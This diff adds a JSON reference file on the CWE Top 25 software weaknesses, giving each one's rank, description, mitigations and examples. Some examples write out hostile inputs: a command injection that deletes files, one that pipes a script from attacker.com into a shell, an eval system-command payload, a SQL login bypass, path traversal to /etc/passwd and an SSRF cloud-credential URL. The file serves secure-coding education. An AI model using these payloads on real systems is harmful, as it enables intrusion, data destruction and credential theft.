@@ -1,0 +1,536 @@
+{
+  "metadata": {
+    "source": "MITRE CWE Top 25 Most Dangerous Software Weaknesses",
+    "year": 2025,
+    "url": "https://cwe.mitre.org/top25/archive/2025/2025_cwe_top25.html",
+    "retrieved": "2025-06-10",
+    "total_entries": 25
+  },
+  "entries": [
+    {
+      "id": "CWE-79",
+      "rank": 1,
+      "score": 60.38,
+      "name": "Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+      "short_name": "Cross-site Scripting (XSS)",
+      "severity": "High",
+      "domain": "injection",
+      "description": "The application embeds untrusted user input into a web page without properly encoding or escaping it. This allows attackers to inject malicious scripts that execute in the victim's browser under the application's origin.",
+      "extended_description": "XSS occurs when user-supplied data is included in HTML output without sanitisation. There are three main types: Reflected XSS (payload in request, reflected in response), Stored XSS (payload saved to database and served to other users), and DOM-based XSS (payload processed by client-side JavaScript). Stored XSS is the most severe because it affects every user who views the infected page.",
+      "mitigations": [
+        "Encode all user-supplied output using context-appropriate escaping (HTML entity encoding for HTML context, JavaScript escaping for script context)",
+        "Use a Content Security Policy (CSP) header to restrict which scripts can execute in the browser",
+        "Validate and sanitise all input on the server side before processing",
+        "Use modern frameworks that automatically escape template output by default (e.g. React, Angular, Django templates)"
+      ],
+      "examples": [
+        "A comment field stores user input and renders it directly as HTML. An attacker submits a comment containing a script tag that steals session cookies from every user who views the page.",
+        "A search results page reflects the query parameter directly into the page title without encoding. An attacker crafts a URL with a malicious script payload and tricks a victim into clicking it."
+      ]
+    },
+    {
+      "id": "CWE-89",
+      "rank": 2,
+      "score": 28.72,
+      "name": "Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)",
+      "short_name": "SQL Injection",
+      "severity": "Critical",
+      "domain": "injection",
+      "description": "User-controlled input is incorporated into an SQL query without proper sanitisation, allowing attackers to modify the query's logic, extract data, modify data, or execute administrative operations on the database.",
+      "extended_description": "SQL injection is one of the most destructive vulnerabilities. By injecting SQL syntax into input fields, attackers can bypass authentication, read all data from the database, insert or delete records, and in some configurations execute operating system commands. Blind SQL injection is a variant where the attacker infers data from the application's behaviour rather than direct output.",
+      "mitigations": [
+        "Always use parameterised queries or prepared statements instead of string concatenation to build SQL queries",
+        "Use an ORM (Object-Relational Mapper) that handles parameterisation automatically",
+        "Apply the principle of least privilege to database accounts — application accounts should not have admin rights",
+        "Validate and whitelist input where possible, but treat this as defence-in-depth not the primary control"
+      ],
+      "examples": [
+        "A login form builds a query like: SELECT * FROM users WHERE username = '<input>' AND password = '<input>'. An attacker enters ' OR '1'='1 as the username, causing the query to return all users and bypass authentication.",
+        "A product search endpoint constructs SQL by concatenating user input. An attacker uses UNION SELECT to extract password hashes from the users table."
+      ]
+    },
+    {
+      "id": "CWE-352",
+      "rank": 3,
+      "score": 13.64,
+      "name": "Cross-Site Request Forgery (CSRF)",
+      "short_name": "CSRF",
+      "severity": "High",
+      "domain": "network",
+      "description": "A web application processes requests from an authenticated user without verifying that the request was intentionally made by that user. An attacker tricks a logged-in victim into submitting a forged request to perform actions on their behalf.",
+      "extended_description": "CSRF exploits the browser's automatic inclusion of session cookies in cross-origin requests. If a user is logged into a banking site and visits a malicious page, that page can trigger a funds transfer request to the bank that carries the user's valid session cookie. The bank cannot distinguish this from a legitimate request.",
+      "mitigations": [
+        "Implement CSRF tokens: include a unique, unpredictable token in each form and validate it server-side on submission",
+        "Use the SameSite cookie attribute (set to Strict or Lax) to prevent cookies being sent with cross-site requests",
+        "Verify the Origin or Referer header on state-changing requests",
+        "Require re-authentication for sensitive operations such as password changes or financial transactions"
+      ],
+      "examples": [
+        "A bank's transfer endpoint accepts a POST request with amount and destination parameters. An attacker hosts a page with a hidden form that auto-submits to this endpoint. Any logged-in customer who visits the page triggers a transfer.",
+        "An admin panel processes a GET request to delete a user account. An attacker embeds an image tag pointing to this URL. Any admin who loads a page with this image triggers the deletion."
+      ]
+    },
+    {
+      "id": "CWE-862",
+      "rank": 4,
+      "score": 13.28,
+      "name": "Missing Authorization",
+      "short_name": "Missing Authorization",
+      "severity": "High",
+      "domain": "access_control",
+      "description": "The application does not perform or incorrectly performs an authorisation check when an actor attempts to access a resource or perform an action. A user can access resources or perform operations they should not be permitted to.",
+      "extended_description": "Missing authorisation is distinct from missing authentication. Authentication checks who you are; authorisation checks what you are allowed to do. A common pattern is checking authentication at login but failing to verify on individual endpoints whether the authenticated user has permission for that specific resource.",
+      "mitigations": [
+        "Enforce authorisation checks on every sensitive endpoint, not just at the application entry point",
+        "Use a centralised authorisation framework rather than ad-hoc checks scattered through the codebase",
+        "Apply deny-by-default: access should require explicit permission, not just the absence of a restriction",
+        "Implement role-based or attribute-based access control and audit it regularly"
+      ],
+      "examples": [
+        "An API endpoint GET /api/invoices/{id} checks that the user is authenticated but not that the invoice belongs to the requesting user. Any logged-in user can retrieve any invoice by guessing IDs.",
+        "An admin-only function to promote users to admin is protected by a UI element being hidden, but the underlying API endpoint has no server-side authorisation check."
+      ]
+    },
+    {
+      "id": "CWE-787",
+      "rank": 5,
+      "score": 12.68,
+      "name": "Out-of-bounds Write",
+      "short_name": "Out-of-bounds Write",
+      "severity": "Critical",
+      "domain": "memory",
+      "description": "The software writes data past the end or before the beginning of an intended buffer. This can corrupt memory, crash the application, or allow an attacker to execute arbitrary code by overwriting control structures.",
+      "extended_description": "Out-of-bounds writes are particularly dangerous in languages like C and C++ where memory management is manual. Attackers can exploit these to overwrite return addresses on the stack, function pointers, or heap metadata. This can redirect program execution to attacker-controlled code. Common causes include missing bounds checks on array indices or loop counters.",
+      "mitigations": [
+        "Use memory-safe languages (Rust, Go, Python) where possible to eliminate this class of vulnerability entirely",
+        "In C/C++, always validate buffer sizes before writing and use safe string functions (strncpy instead of strcpy)",
+        "Enable compiler protections such as stack canaries, ASLR, and DEP/NX",
+        "Use static analysis tools and fuzzing to detect out-of-bounds conditions during development"
+      ],
+      "examples": [
+        "A function copies user-supplied data into a fixed-size stack buffer using strcpy without checking the input length. An attacker supplies input longer than the buffer, overwriting the return address and redirecting execution.",
+        "A loop iterates over an array using an index derived from user input without validating the index is within bounds. A negative or overly large index writes outside the array."
+      ]
+    },
+    {
+      "id": "CWE-22",
+      "rank": 6,
+      "score": 8.99,
+      "name": "Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)",
+      "short_name": "Path Traversal",
+      "severity": "High",
+      "domain": "input_validation",
+      "description": "User-supplied input is used to construct a file path without properly neutralising special sequences like ../ that navigate up the directory tree. This allows attackers to access files outside the intended directory.",
+      "extended_description": "Path traversal can lead to reading sensitive configuration files, credentials, or source code. In write scenarios it can overwrite system files. Attackers use sequences like ../../etc/passwd or URL-encoded variants like %2e%2e%2f to bypass naive filters. The vulnerability is common in file download, image serving, and log viewing features.",
+      "mitigations": [
+        "Resolve the canonical absolute path of any user-supplied filename and verify it starts with the intended base directory",
+        "Use a whitelist of allowed filenames rather than accepting arbitrary paths",
+        "Run the application with the minimum filesystem permissions necessary",
+        "Avoid passing user input directly to filesystem APIs; use indirect references such as a database key that maps to a file path"
+      ],
+      "examples": [
+        "A file download endpoint takes a filename parameter and serves the file from a uploads directory. An attacker requests filename=../../etc/passwd to read the system password file.",
+        "An application logs user-supplied data to a file whose name includes the username. An attacker registers with a username containing ../ sequences to write log data to an arbitrary location."
+      ]
+    },
+    {
+      "id": "CWE-416",
+      "rank": 7,
+      "score": 8.47,
+      "name": "Use After Free",
+      "short_name": "Use After Free",
+      "severity": "Critical",
+      "domain": "memory",
+      "description": "The application continues to use a pointer after the memory it references has been freed. This leads to undefined behaviour, crashes, data corruption, or exploitation to achieve arbitrary code execution.",
+      "extended_description": "After memory is freed, the allocator may reuse it for a different object. If the original pointer is dereferenced again, the application reads or writes to memory that now belongs to a different object or allocation. Attackers can craft heap layouts that place attacker-controlled data at the freed location, then trigger the use-after-free to corrupt program state.",
+      "mitigations": [
+        "Set pointers to NULL immediately after freeing the memory they reference",
+        "Use smart pointers in C++ (unique_ptr, shared_ptr) that automatically manage object lifetime",
+        "Use memory-safe languages that manage memory automatically",
+        "Apply AddressSanitizer during development and testing to detect use-after-free conditions at runtime"
+      ],
+      "examples": [
+        "An object is freed during an error handling path but a reference to it remains in a list. Later code iterates the list and calls a method on the freed object, whose memory has been reallocated to an attacker-controlled buffer.",
+        "A browser engine frees a DOM element during a callback but a JavaScript reference to it still exists. Subsequent access through the JavaScript reference reads from freed memory."
+      ]
+    },
+    {
+      "id": "CWE-125",
+      "rank": 8,
+      "score": 7.88,
+      "name": "Out-of-bounds Read",
+      "short_name": "Out-of-bounds Read",
+      "severity": "High",
+      "domain": "memory",
+      "description": "The software reads data past the end or before the beginning of an intended buffer. This can expose sensitive memory contents to an attacker or cause a crash.",
+      "extended_description": "Out-of-bounds reads are most commonly exploited for information disclosure. By reading beyond a buffer, an attacker may obtain heap metadata, stack memory contents, or cryptographic keys. The Heartbleed vulnerability (CVE-2014-0160) is a famous example. Even when not directly exploitable for code execution, leaked memory can help defeat ASLR.",
+      "mitigations": [
+        "Always validate array indices and buffer lengths before reading",
+        "Use safe abstractions that track buffer length and enforce bounds automatically",
+        "Enable compiler warnings for potential out-of-bounds access patterns",
+        "Fuzz network-facing parsers and input handlers to detect read overflows"
+      ],
+      "examples": [
+        "A TLS heartbeat implementation reads a specified number of bytes from a buffer but does not verify the specified length is not larger than the actual buffer size, leaking server memory to the client.",
+        "A parser reads a field length from user-supplied data and allocates a response buffer accordingly, but reads beyond the actual data available when the supplied length is larger than the real data."
+      ]
+    },
+    {
+      "id": "CWE-78",
+      "rank": 9,
+      "score": 7.85,
+      "name": "Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)",
+      "short_name": "OS Command Injection",
+      "severity": "Critical",
+      "domain": "injection",
+      "description": "User-supplied input is passed to a system shell command without proper sanitisation. An attacker can inject additional shell commands that execute with the privileges of the application process.",
+      "extended_description": "Command injection is one of the most severe vulnerabilities because it gives attackers direct access to the operating system. Attackers append commands using shell metacharacters like semicolons, pipes, backticks, or ampersands. The injected commands run with the same permissions as the application, which may be sufficient to read secrets, exfiltrate data, install malware, or pivot to other systems.",
+      "mitigations": [
+        "Avoid invoking shell commands with user input entirely; use language-native libraries instead (e.g. Python's os.listdir instead of running ls via shell)",
+        "If shell execution is unavoidable, use parameterised command APIs that do not invoke a shell interpreter (e.g. subprocess with a list of arguments, not shell=True)",
+        "Whitelist permitted input values rather than trying to blacklist dangerous characters",
+        "Run the application with the minimum OS privileges necessary to limit the impact of injection"
+      ],
+      "examples": [
+        "A web application pings a host entered by the user via os.system('ping ' + user_input). An attacker enters '8.8.8.8; rm -rf /' to append a destructive command.",
+        "A file conversion tool passes a user-supplied filename to a shell command. An attacker names a file 'file.txt; curl attacker.com/shell.sh | bash' to execute a remote script."
+      ]
+    },
+    {
+      "id": "CWE-94",
+      "rank": 10,
+      "score": 7.57,
+      "name": "Improper Control of Generation of Code (Code Injection)",
+      "short_name": "Code Injection",
+      "severity": "Critical",
+      "domain": "injection",
+      "description": "The application dynamically generates and executes code using user-supplied input without proper validation. An attacker can inject arbitrary code that is executed by the application's runtime.",
+      "extended_description": "Code injection includes eval() injection in JavaScript and Python, template injection in server-side template engines, and similar patterns. Unlike OS command injection, the injected code runs within the application's runtime environment. This allows reading application variables, accessing secrets in memory, and potentially escalating to OS-level access.",
+      "mitigations": [
+        "Never pass user input to eval(), exec(), or equivalent runtime code execution functions",
+        "Use safe template engines configured to auto-escape output and that do not allow arbitrary expression evaluation",
+        "Validate input strictly against an allowlist before any dynamic code generation",
+        "Treat server-side template injection as equivalent in severity to remote code execution"
+      ],
+      "examples": [
+        "A Python application uses eval(user_input) to compute arithmetic expressions. An attacker submits __import__('os').system('id') to execute a system command.",
+        "A Jinja2 template renders a user-supplied string with template syntax enabled. An attacker submits {{config.items()}} to extract application configuration secrets."
+      ]
+    },
+    {
+      "id": "CWE-120",
+      "rank": 11,
+      "score": 6.96,
+      "name": "Buffer Copy without Checking Size of Input (Classic Buffer Overflow)",
+      "short_name": "Classic Buffer Overflow",
+      "severity": "High",
+      "domain": "memory",
+      "description": "The application copies data from a source buffer to a destination buffer without verifying the source is not larger than the destination. Excess data overwrites adjacent memory, potentially corrupting control structures.",
+      "extended_description": "Classic buffer overflows have been exploited since the 1980s but remain prevalent in C and C++ codebases. The strcpy, sprintf, and gets functions are notorious sources of this vulnerability. Overflowing a stack buffer can overwrite the saved return address, allowing an attacker to redirect execution to shellcode or return-oriented programming chains.",
+      "mitigations": [
+        "Replace unsafe C functions (strcpy, sprintf, gets) with size-aware alternatives (strncpy, snprintf, fgets)",
+        "Validate input lengths before performing any copy operation",
+        "Enable stack canaries, ASLR, and non-executable stack protections in the build",
+        "Migrate to memory-safe languages or use memory-safe wrappers around legacy C code"
+      ],
+      "examples": [
+        "A function declares a 256-byte stack buffer and calls strcpy to copy user input into it. If the input exceeds 256 bytes, the return address is overwritten.",
+        "A network protocol parser reads a length field from a packet and copies that many bytes from the packet body into a fixed-size buffer without checking whether the declared length fits."
+      ]
+    },
+    {
+      "id": "CWE-434",
+      "rank": 12,
+      "score": 6.87,
+      "name": "Unrestricted Upload of File with Dangerous Type",
+      "short_name": "Unrestricted File Upload",
+      "severity": "High",
+      "domain": "input_validation",
+      "description": "The application allows users to upload files without adequately restricting the type, content, or destination of those files. An attacker can upload executable files such as web shells that can then be executed on the server.",
+      "extended_description": "File upload vulnerabilities are common in content management systems, profile photo features, and document upload portals. The most severe outcome is remote code execution via a web shell. Attackers can bypass MIME type checks by manipulating Content-Type headers and bypass extension checks using double extensions like shell.php.jpg or null byte injection.",
+      "mitigations": [
+        "Validate file type using file content inspection (magic bytes), not just the extension or Content-Type header",
+        "Store uploaded files outside the web root so they cannot be directly accessed via URL",
+        "Rename uploaded files to a random identifier to prevent execution by known filename",
+        "Limit allowed file types to an explicit whitelist and reject everything else"
+      ],
+      "examples": [
+        "A profile picture upload accepts any file. An attacker uploads a PHP web shell as avatar.php. If the uploads directory is within the web root, navigating to the file executes the shell on the server.",
+        "An application checks the file extension against a blacklist but not the Content-Type. An attacker renames a PHP file to shell.php.jpg, which passes the extension check, and the server executes it as PHP."
+      ]
+    },
+    {
+      "id": "CWE-476",
+      "rank": 13,
+      "score": 6.41,
+      "name": "NULL Pointer Dereference",
+      "short_name": "NULL Pointer Dereference",
+      "severity": "Medium",
+      "domain": "memory",
+      "description": "The application dereferences a pointer that it expects to be valid but is NULL. This typically causes the application to crash, resulting in a denial of service. In some architectures it can lead to code execution.",
+      "extended_description": "NULL pointer dereferences most commonly occur when a function that can return NULL on failure has its return value used without checking. In server applications this is a denial-of-service risk. In embedded or kernel contexts where address 0 may be mappable, it can potentially be exploited for code execution.",
+      "mitigations": [
+        "Always check the return value of functions that can return NULL before dereferencing the pointer",
+        "Initialise all pointers explicitly and set them to NULL after freeing",
+        "Use static analysis tools that detect potential NULL dereferences in the code path",
+        "Apply defensive null checks at public API boundaries where external data enters the system"
+      ],
+      "examples": [
+        "malloc() returns NULL when memory allocation fails. Code that immediately dereferences the result without a null check will crash when memory is exhausted.",
+        "A function searches a linked list for an item and returns NULL if not found. The caller uses the result without checking, dereferencing NULL when the item is absent."
+      ]
+    },
+    {
+      "id": "CWE-121",
+      "rank": 14,
+      "score": 5.75,
+      "name": "Stack-based Buffer Overflow",
+      "short_name": "Stack-based Buffer Overflow",
+      "severity": "High",
+      "domain": "memory",
+      "description": "A buffer overflow occurs on the stack, overwriting adjacent stack data including return addresses and saved frame pointers. This is a subtype of CWE-120 and is one of the most commonly exploited memory corruption vulnerabilities.",
+      "extended_description": "Stack-based overflows are classic exploitation targets because the stack contains the return address that controls where execution resumes when a function returns. By overwriting this address, an attacker can redirect execution. Modern mitigations like stack canaries, ASLR, and non-executable stack make exploitation harder but not impossible, particularly when combined with other techniques like return-oriented programming.",
+      "mitigations": [
+        "Use bounded string and memory copy functions that accept a maximum length parameter",
+        "Enable stack canaries in the compiler to detect stack corruption before function return",
+        "Enable ASLR and non-executable stack (NX/DEP) at the OS and build level",
+        "Consider rewriting vulnerable C/C++ code in a memory-safe language for long-lived projects"
+      ],
+      "examples": [
+        "A function declares char buf[64] and reads user input with gets(buf). An attacker supplies 80 bytes, overwriting 16 bytes past the buffer and corrupting the return address.",
+        "A recursive function allocates local arrays on the stack. Deeply nested calls with user-controlled depth exhaust the stack and overflow into adjacent stack frames."
+      ]
+    },
+    {
+      "id": "CWE-502",
+      "rank": 15,
+      "score": 5.23,
+      "name": "Deserialization of Untrusted Data",
+      "short_name": "Insecure Deserialization",
+      "severity": "Critical",
+      "domain": "input_validation",
+      "description": "The application deserialises data from an untrusted source without validating it. An attacker can craft malicious serialised objects that trigger unintended code execution or logic manipulation during the deserialisation process.",
+      "extended_description": "Insecure deserialisation can lead to remote code execution, authentication bypass, and privilege escalation. Many serialisation libraries (Python pickle, Java ObjectInputStream, PHP unserialize) execute code as part of the deserialisation process. Attackers craft gadget chains that exploit existing classes in the application's classpath to achieve arbitrary code execution when deserialised.",
+      "mitigations": [
+        "Never deserialise data from untrusted sources using formats that support code execution (Python pickle, Java native serialisation)",
+        "Use data-only formats (JSON, XML with schema validation) for data exchange with untrusted parties",
+        "If deserialising is unavoidable, use integrity checks (digital signatures) to verify data has not been tampered with before deserialising",
+        "Implement a whitelist of classes that are permitted to be deserialised"
+      ],
+      "examples": [
+        "A Python application uses pickle.loads() on data received from a cookie. An attacker crafts a malicious pickle payload that calls os.system() during deserialisation, achieving remote code execution.",
+        "A Java application deserialises session objects from a database. An attacker who can write to the database injects a gadget chain that executes commands when the session is loaded."
+      ]
+    },
+    {
+      "id": "CWE-122",
+      "rank": 16,
+      "score": 5.21,
+      "name": "Heap-based Buffer Overflow",
+      "short_name": "Heap-based Buffer Overflow",
+      "severity": "High",
+      "domain": "memory",
+      "description": "A buffer overflow that occurs in heap memory, overwriting heap metadata or adjacent heap allocations. Heap overflows can be exploited to corrupt object vtables, function pointers, or heap management structures to achieve code execution.",
+      "extended_description": "Heap overflows are harder to exploit than stack overflows because the heap layout is less predictable, but they remain a significant attack vector. Modern heap allocators have added integrity checks but determined attackers use heap grooming techniques to arrange favourable memory layouts. Common causes include integer overflows that produce undersized allocation sizes.",
+      "mitigations": [
+        "Validate all length values before heap allocation and before copying data into heap buffers",
+        "Check for integer overflows in size calculations before calling malloc or equivalent allocators",
+        "Use memory-safe languages or smart pointer types that enforce bounds",
+        "Enable heap hardening features provided by the operating system and allocator"
+      ],
+      "examples": [
+        "An integer overflow in a size calculation results in a smaller-than-expected heap allocation. Subsequent data copying fills beyond the allocated region, corrupting adjacent heap objects.",
+        "An image parsing library allocates a buffer based on a width and height field from the file. An attacker crafts an image with dimensions that produce a small allocation but supplies more pixel data than fits."
+      ]
+    },
+    {
+      "id": "CWE-863",
+      "rank": 17,
+      "score": 4.14,
+      "name": "Incorrect Authorization",
+      "short_name": "Incorrect Authorization",
+      "severity": "High",
+      "domain": "access_control",
+      "description": "The application performs an authorisation check but the check is flawed, allowing access that should be denied. This differs from missing authorisation (CWE-862) in that a check exists but is incorrectly implemented.",
+      "extended_description": "Incorrect authorisation includes checking the wrong attribute (checking role but not resource ownership), checking in the wrong location (client-side only), logic errors in permission evaluation (e.g. checking OR instead of AND for multiple required conditions), or using untrusted data as the basis for the authorisation decision.",
+      "mitigations": [
+        "Perform authorisation checks server-side using trusted data, never data supplied by the client",
+        "Test authorisation logic explicitly with negative test cases that verify denied access",
+        "Use a proven authorisation library or framework rather than hand-rolling permission checks",
+        "Review authorisation logic independently from the developer who wrote it"
+      ],
+      "examples": [
+        "An endpoint checks that the user has an admin role but uses a role value from the request body rather than from the server-side session. An attacker modifies the request to claim an admin role.",
+        "A permission check verifies the user owns a resource by comparing a user_id from the URL parameter to the session, but the URL parameter can be freely changed by the client."
+      ]
+    },
+    {
+      "id": "CWE-20",
+      "rank": 18,
+      "score": 4.09,
+      "name": "Improper Input Validation",
+      "short_name": "Improper Input Validation",
+      "severity": "Medium",
+      "domain": "input_validation",
+      "description": "The application does not validate or incorrectly validates input that can affect the control flow or data flow of the program. This is a broad category that underlies many more specific weaknesses.",
+      "extended_description": "Input validation failures are the root cause of a large proportion of security vulnerabilities. Validation should cover type, length, format, range, and business logic constraints. Validation must occur on the server side; client-side validation can always be bypassed. Validation is not the same as sanitisation or escaping, which are output controls.",
+      "mitigations": [
+        "Validate all input against a strict whitelist of expected values, types, lengths, and formats",
+        "Perform validation server-side regardless of whether client-side validation exists",
+        "Reject invalid input early, before it reaches business logic or data access layers",
+        "Use well-tested validation libraries rather than writing custom regular expressions for complex formats"
+      ],
+      "examples": [
+        "An age field accepts any string. The application passes it to a database query after converting to integer, but a non-numeric input causes an unhandled exception that reveals a stack trace.",
+        "A date range query accepts start and end dates without validating that start is before end. Business logic that assumes valid ordering breaks in unexpected ways with reversed input."
+      ]
+    },
+    {
+      "id": "CWE-284",
+      "rank": 19,
+      "score": 4.07,
+      "name": "Improper Access Control",
+      "short_name": "Improper Access Control",
+      "severity": "High",
+      "domain": "access_control",
+      "description": "The software does not restrict or incorrectly restricts access to a resource from an unauthorised actor. This is a broad category covering failures in authentication, authorisation, and access control mechanisms.",
+      "extended_description": "Improper access control is the parent of many more specific weaknesses including missing authorisation (CWE-862) and missing authentication (CWE-306). It encompasses any situation where a security boundary is not properly enforced between actors with different privilege levels.",
+      "mitigations": [
+        "Define and document the access control model before implementation",
+        "Enforce access controls at every layer of the application (API, service, data)",
+        "Apply the principle of least privilege throughout the system",
+        "Conduct access control testing as part of every security review"
+      ],
+      "examples": [
+        "API endpoints intended only for internal microservice communication are exposed on the public internet without authentication.",
+        "A multi-tenant application uses a shared database with tenant ID filtering, but a missing WHERE clause in one query returns records from all tenants."
+      ]
+    },
+    {
+      "id": "CWE-200",
+      "rank": 20,
+      "score": 4.01,
+      "name": "Exposure of Sensitive Information to an Unauthorized Actor",
+      "short_name": "Sensitive Information Exposure",
+      "severity": "Medium",
+      "domain": "information_disclosure",
+      "description": "The application exposes sensitive information to an actor who is not authorised to see it. This includes data in error messages, logs, API responses, or unprotected files.",
+      "extended_description": "Information disclosure can enable further attacks by revealing internal architecture, credentials, or personal data. Common sources include verbose error messages containing stack traces, API responses that return more fields than necessary, debug endpoints left enabled in production, and log files containing sensitive data.",
+      "mitigations": [
+        "Return generic error messages to users; log detailed errors server-side only",
+        "Audit API responses to ensure they do not include fields not needed by the client",
+        "Disable debug endpoints, verbose error modes, and developer tools in production",
+        "Classify data sensitivity and apply appropriate access controls to logs and error outputs"
+      ],
+      "examples": [
+        "An unhandled exception returns a full stack trace including file paths, framework versions, and database credentials in the HTTP response body.",
+        "A user profile API returns all database columns including password hashes, internal flags, and other users' data when queried with a valid session."
+      ]
+    },
+    {
+      "id": "CWE-306",
+      "rank": 21,
+      "score": 3.47,
+      "name": "Missing Authentication for Critical Function",
+      "short_name": "Missing Authentication",
+      "severity": "High",
+      "domain": "access_control",
+      "description": "The application does not authenticate users for functionality that requires a verified identity. Critical operations are accessible without any proof of identity.",
+      "extended_description": "Missing authentication is most dangerous on administrative functions, data modification endpoints, and operations with financial or safety implications. It commonly arises from oversight during development, from internal APIs mistakenly exposed, or from assumptions about network-level access controls that do not hold.",
+      "mitigations": [
+        "Require authentication for all state-changing operations and all access to non-public data",
+        "Implement authentication at a framework or middleware level so it cannot be forgotten for individual routes",
+        "Conduct endpoint discovery testing to identify unauthenticated routes in the application",
+        "Never rely solely on network-level controls to protect unauthenticated endpoints"
+      ],
+      "examples": [
+        "An administrative panel at /admin resets passwords and manages users but was built for internal use and has no authentication check. When accidentally exposed to the internet, it provides full admin access to anyone.",
+        "An IoT device exposes a management API on a local network port without authentication, assuming local network access implies trust."
+      ]
+    },
+    {
+      "id": "CWE-918",
+      "rank": 22,
+      "score": 3.36,
+      "name": "Server-Side Request Forgery (SSRF)",
+      "short_name": "Server-Side Request Forgery (SSRF)",
+      "severity": "High",
+      "domain": "network",
+      "description": "The server fetches a URL supplied by user input without validating the destination. An attacker can cause the server to make requests to internal services, cloud metadata endpoints, or other unintended destinations.",
+      "extended_description": "SSRF became more dangerous with the rise of cloud computing. Attackers can use SSRF to query cloud metadata services (e.g. AWS Instance Metadata Service at 169.254.169.254) to extract temporary credentials, pivot to internal services behind firewalls, or scan internal networks. SSRF can be exploited even when responses are not returned to the attacker (blind SSRF).",
+      "mitigations": [
+        "Validate that user-supplied URLs resolve to expected external destinations, blocking private IP ranges and loopback addresses",
+        "Use a server-side allow list of permitted domains rather than a blocklist of forbidden ones",
+        "Disable unnecessary URL schemes (file://, gopher://, dict://) in HTTP client configurations",
+        "Deploy SSRF-resistant network architecture that limits what internal services the application server can reach"
+      ],
+      "examples": [
+        "A webhook configuration feature allows users to enter a URL for notifications. An attacker enters http://169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve AWS credentials via the cloud metadata service.",
+        "A URL preview feature fetches external URLs to generate thumbnails. An attacker provides http://internal-db-server:5432/ to probe internal network services."
+      ]
+    },
+    {
+      "id": "CWE-77",
+      "rank": 23,
+      "score": 3.15,
+      "name": "Improper Neutralization of Special Elements used in a Command (Command Injection)",
+      "short_name": "Command Injection",
+      "severity": "Critical",
+      "domain": "injection",
+      "description": "User-supplied input is incorporated into a command sent to a component without neutralising special elements. This is the parent of OS command injection (CWE-78) and covers injection into any command interpreter, not just OS shells.",
+      "extended_description": "Command injection covers a broader range of scenarios than OS command injection, including injection into SQL-like query languages, LDAP queries, XML parsers, and other command interpreters. The common thread is that user input is concatenated into a command string and executed by an interpreter that assigns special meaning to certain characters.",
+      "mitigations": [
+        "Use parameterised or structured interfaces for all command execution rather than string concatenation",
+        "Treat user input as data, never as part of command syntax",
+        "Apply context-specific escaping when parameterised interfaces are unavailable",
+        "Validate input against a strict allowlist before including it in any command"
+      ],
+      "examples": [
+        "An LDAP query incorporates a username from user input without escaping LDAP special characters. An attacker injects LDAP filter syntax to bypass authentication or extract directory data.",
+        "An application constructs a command for an external process by concatenating configuration values that include user input. An attacker manipulates configuration to inject additional command arguments."
+      ]
+    },
+    {
+      "id": "CWE-639",
+      "rank": 24,
+      "score": 2.62,
+      "name": "Authorization Bypass Through User-Controlled Key",
+      "short_name": "Insecure Direct Object Reference (IDOR)",
+      "severity": "High",
+      "domain": "access_control",
+      "description": "The application uses a user-controlled key to access an object without verifying the user is authorised to access that specific object. This is commonly known as an Insecure Direct Object Reference (IDOR).",
+      "extended_description": "IDOR is one of the most widespread API vulnerabilities. The application correctly authenticates the user but uses an ID from the request (user ID, order ID, document ID) to retrieve data without checking ownership. By incrementing or guessing IDs, attackers can access other users' data. Modern applications with predictable sequential IDs are particularly vulnerable.",
+      "mitigations": [
+        "Validate on every request that the authenticated user is authorised to access the specific resource identified by the key",
+        "Use indirect references that map to database IDs server-side rather than exposing real IDs in URLs",
+        "Use unpredictable identifiers (UUIDs) rather than sequential integers, as defence-in-depth not the primary control",
+        "Test all data access endpoints with credentials from a different user to verify access is denied"
+      ],
+      "examples": [
+        "GET /api/orders/12345 returns order 12345. An authenticated user changes 12345 to 12346 and retrieves another customer's order without any error.",
+        "A password reset link includes the user's database ID as a URL parameter. An attacker who receives their own reset link modifies the ID to reset another user's password."
+      ]
+    },
+    {
+      "id": "CWE-770",
+      "rank": 25,
+      "score": 2.54,
+      "name": "Allocation of Resources Without Limits or Throttling",
+      "short_name": "Uncontrolled Resource Allocation",
+      "severity": "Medium",
+      "domain": "resource_management",
+      "description": "The application allocates resources such as memory, file handles, or threads in response to requests without enforcing limits. An attacker can exhaust available resources, causing denial of service for legitimate users.",
+      "extended_description": "Resource exhaustion attacks are often overlooked because they do not involve code execution. However, they can be as damaging as other attacks by making a service unavailable. Common scenarios include accepting arbitrarily large request bodies, creating unlimited database connections, spawning threads or processes per request without a pool, and failing to release resources in error paths.",
+      "mitigations": [
+        "Enforce maximum sizes on all user-supplied data including request bodies, file uploads, and query results",
+        "Implement rate limiting on resource-intensive endpoints to prevent exhaustion by a single client",
+        "Use connection pools, thread pools, and other managed resource abstractions with configured limits",
+        "Set timeouts on all external calls and resource acquisitions to prevent indefinite blocking"
+      ],
+      "examples": [
+        "A file processing endpoint accepts uploads without a size limit. An attacker uploads a multi-gigabyte file repeatedly, exhausting server disk space and memory.",
+        "An API endpoint performs a database query with a user-controlled LIMIT parameter. An attacker sets LIMIT to a very large number, causing the database to return millions of rows and exhaust server memory."
+      ]
+    }
+  ]
+}
